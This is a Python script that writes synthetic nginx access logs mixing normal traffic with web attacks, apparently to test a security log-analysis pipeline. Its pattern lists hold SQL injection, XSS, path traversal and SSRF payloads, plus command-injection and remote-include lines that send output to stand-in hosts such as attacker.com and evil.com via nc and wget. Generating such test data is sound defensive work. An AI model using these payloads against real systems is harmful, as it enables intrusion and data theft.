#!/usr/bin/env python3
"""
Web Attack Log Generator for Wildbox Testing

This script generates realistic nginx access logs with various web attack patterns
for testing the Wildbox log ingestion and analysis pipeline.

Usage:
    python generate_logs.py --output /tmp/test-access.log --count 1000
    python generate_logs.py --output /tmp/test-access.log --duration 3600 --realtime
"""

import argparse
import random
import time
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any


class WebAttackLogGenerator:
    """Generate realistic web attack logs for testing"""

    def __init__(self):
        # Legitimate user agents
        self.legitimate_user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        ]

        # Attack user agents
        self.attack_user_agents = [
            "sqlmap/1.7.2#stable (http://sqlmap.org)",
            "Nikto/2.1.6",
            "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
            "Acunetix Web Vulnerability Scanner",
            "WPScan v3.8.22",
            "ZmEu",
            "python-requests/2.28.0",
            "curl/7.68.0",
        ]

        # Legitimate IPs (RFC 1918 private addresses)
        self.legitimate_ips = [f"192.168.1.{i}" for i in range(50, 100)]

        # Attacker IPs
        self.attacker_ips = [f"10.0.0.{i}" for i in range(100, 120)]

        # Legitimate paths
        self.legitimate_paths = [
            "/",
            "/about",
            "/contact",
            "/products",
            "/services",
            "/blog",
            "/api/products",
            "/api/users",
            "/images/logo.png",
            "/css/style.css",
            "/js/app.js",
        ]

        # SQL Injection patterns
        self.sql_injection_patterns = [
            "/products?id=1' OR '1'='1",
            "/user?id=1 UNION SELECT username,password FROM users--",
            "/search?q='; DROP TABLE products;--",
            "/login?user=admin'--",
            "/api/data?id=1' AND 1=1--",
            "/products?category=' UNION ALL SELECT NULL,NULL,NULL--",
            "/search?q=1' AND SLEEP(5)--",
        ]

        # Path Traversal patterns
        self.path_traversal_patterns = [
            "/../../../etc/passwd",
            "/download?file=../../../../etc/shadow",
            "/files/..%2F..%2F..%2Fetc%2Fpasswd",
            "/images/../../../windows/system32/config/sam",
            "/docs/../../../../root/.ssh/id_rsa",
        ]

        # XSS patterns
        self.xss_patterns = [
            "/search?q=<script>alert('XSS')</script>",
            "/comment?text=<img src=x onerror=alert(1)>",
            "/profile?name=<iframe src=javascript:alert('XSS')>",
            "/page?content=<svg/onload=alert('XSS')>",
            "/input?data=<body onload=alert('XSS')>",
        ]

        # Command Injection patterns
        self.command_injection_patterns = [
            "/ping?host=127.0.0.1;cat /etc/passwd",
            "/exec?cmd=ls -la | nc attacker.com 1234",
            "/run?command=`wget http://evil.com/shell.sh`",
            "/system?cmd=$(whoami)",
        ]

        # LFI/RFI patterns
        self.lfi_rfi_patterns = [
            "/page?file=/etc/passwd",
            "/include?file=php://filter/convert.base64-encode/resource=index",
            "/view?file=../../../../../../etc/passwd%00",
            "/page?file=http://evil.com/shell.txt",
            "/include?url=http://attacker.com/malware.php",
        ]

        # SSRF patterns
        self.ssrf_patterns = [
            "/proxy?url=http://localhost/admin",
            "/fetch?url=http://169.254.169.254/latest/meta-data/",
            "/image?src=http://internal-server:8080/secrets",
        ]

        # WordPress specific
        self.wordpress_patterns = [
            "/wp-admin/",
            "/wp-login.php",
            "/xmlrpc.php",
            "/wp-content/plugins/",
            "/wp-admin/admin-ajax.php",
        ]

    def generate_legitimate_log(self, timestamp: datetime) -> str:
        """Generate a legitimate access log entry"""
        ip = random.choice(self.legitimate_ips)
        path = random.choice(self.legitimate_paths)
        user_agent = random.choice(self.legitimate_user_agents)
        status = random.choice([200, 200, 200, 200, 304, 301, 404])
        size = random.randint(500, 10000)
        referer = random.choice(["-", f"http://example.com{random.choice(self.legitimate_paths)}"])

        timestamp_str = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")

        return f'{ip} - - [{timestamp_str}] "GET {path} HTTP/1.1" {status} {size} "{referer}" "{user_agent}"'

    def generate_sql_injection_log(self, timestamp: datetime) -> str:
        """Generate a SQL injection attack log entry"""
        ip = random.choice(self.attacker_ips)
        pattern = random.choice(self.sql_injection_patterns)
        user_agent = random.choice(self.attack_user_agents[:3])  # sqlmap, automated tools
        status = random.choice([200, 500, 403])
        size = random.randint(100, 5000)

        timestamp_str = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")

        return f'{ip} - - [{timestamp_str}] "GET {pattern} HTTP/1.1" {status} {size} "-" "{user_agent}"'

    def generate_path_traversal_log(self, timestamp: datetime) -> str:
        """Generate a path traversal attack log entry"""
        ip = random.choice(self.attacker_ips)
        pattern = random.choice(self.path_traversal_patterns)
        user_agent = "curl/7.68.0"
        status = random.choice([404, 403])
        size = 162

        timestamp_str = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")

        return f'{ip} - - [{timestamp_str}] "GET {pattern} HTTP/1.1" {status} {size} "-" "{user_agent}"'

    def generate_xss_log(self, timestamp: datetime) -> str:
        """Generate an XSS attack log entry"""
        ip = random.choice(self.attacker_ips)
        pattern = random.choice(self.xss_patterns)
        user_agent = random.choice(self.legitimate_user_agents)
        status = 200
        size = random.randint(1000, 3000)

        timestamp_str = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")

        return f'{ip} - - [{timestamp_str}] "GET {pattern} HTTP/1.1" {status} {size} "-" "{user_agent}"'

    def generate_command_injection_log(self, timestamp: datetime) -> str:
        """Generate a command injection attack log entry"""
        ip = random.choice(self.attacker_ips)
        pattern = random.choice(self.command_injection_patterns)
        user_agent = "curl/7.68.0"
        status = 500
        size = 234

        timestamp_str = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")

        return f'{ip} - - [{timestamp_str}] "GET {pattern} HTTP/1.1" {status} {size} "-" "{user_agent}"'

    def generate_lfi_rfi_log(self, timestamp: datetime) -> str:
        """Generate a LFI/RFI attack log entry"""
        ip = random.choice(self.attacker_ips)
        pattern = random.choice(self.lfi_rfi_patterns)
        user_agent = random.choice(["curl/7.68.0", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)"])
        status = random.choice([403, 404, 500])
        size = 162

        timestamp_str = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")

        return f'{ip} - - [{timestamp_str}] "GET {pattern} HTTP/1.1" {status} {size} "-" "{user_agent}"'

    def generate_brute_force_log(self, timestamp: datetime) -> str:
        """Generate a brute force login attempt log entry"""
        ip = random.choice(self.attacker_ips)
        path = "/admin/login"
        user_agent = "python-requests/2.28.0"
        status = 401
        size = 234

        timestamp_str = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")

        return f'{ip} - - [{timestamp_str}] "POST {path} HTTP/1.1" {status} {size} "-" "{user_agent}"'

    def generate_scanner_log(self, timestamp: datetime) -> str:
        """Generate a security scanner log entry"""
        ip = random.choice(self.attacker_ips)
        path = random.choice(self.wordpress_patterns + ["/admin", "/", "/cgi-bin/", "/phpMyAdmin"])
        user_agent = random.choice(self.attack_user_agents)
        status = random.choice([200, 404, 403])
        size = random.randint(100, 2000)

        timestamp_str = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")

        return f'{ip} - - [{timestamp_str}] "GET {path} HTTP/1.1" {status} {size} "-" "{user_agent}"'

    def generate_log_entry(self, timestamp: datetime, attack_probability: float = 0.3) -> str:
        """Generate a log entry (either legitimate or attack)"""
        if random.random() < attack_probability:
            # Generate attack log
            attack_type = random.choices(
                [
                    self.generate_sql_injection_log,
                    self.generate_path_traversal_log,
                    self.generate_xss_log,
                    self.generate_command_injection_log,
                    self.generate_lfi_rfi_log,
                    self.generate_brute_force_log,
                    self.generate_scanner_log,
                ],
                weights=[0.2, 0.15, 0.15, 0.1, 0.1, 0.15, 0.15],
            )[0]
            return attack_type(timestamp)
        else:
            # Generate legitimate log
            return self.generate_legitimate_log(timestamp)


def main():
    parser = argparse.ArgumentParser(description="Generate web attack logs for testing")
    parser.add_argument(
        "--output",
        "-o",
        type=str,
        default="generated-access.log",
        help="Output log file path",
    )
    parser.add_argument(
        "--count",
        "-c",
        type=int,
        default=100,
        help="Number of log entries to generate",
    )
    parser.add_argument(
        "--attack-rate",
        "-a",
        type=float,
        default=0.3,
        help="Probability of attack logs (0.0 to 1.0)",
    )
    parser.add_argument(
        "--realtime",
        "-r",
        action="store_true",
        help="Generate logs in real-time (one per second)",
    )
    parser.add_argument(
        "--duration",
        "-d",
        type=int,
        help="Duration in seconds for real-time generation",
    )

    args = parser.parse_args()

    generator = WebAttackLogGenerator()

    print(f"Generating logs to: {args.output}")
    print(f"Attack probability: {args.attack_rate * 100}%")

    with open(args.output, "w") as f:
        if args.realtime:
            # Real-time generation
            count = args.duration if args.duration else args.count
            print(f"Generating logs in real-time for {count} seconds...")

            for i in range(count):
                timestamp = datetime.now(timezone.utc)
                log_entry = generator.generate_log_entry(timestamp, args.attack_rate)
                f.write(log_entry + "\n")
                f.flush()
                print(f"[{i+1}/{count}] {log_entry}")
                time.sleep(1)
        else:
            # Batch generation with timestamps spread over the last hour
            print(f"Generating {args.count} log entries...")
            start_time = datetime.now(timezone.utc) - timedelta(hours=1)

            for i in range(args.count):
                # Spread timestamps evenly over the last hour
                timestamp = start_time + timedelta(seconds=(3600 / args.count) * i)
                log_entry = generator.generate_log_entry(timestamp, args.attack_rate)
                f.write(log_entry + "\n")

                if (i + 1) % 100 == 0:
                    print(f"Generated {i + 1}/{args.count} entries...")

    print(f"\nLog generation complete!")
    print(f"Output file: {args.output}")


if __name__ == "__main__":
    main()
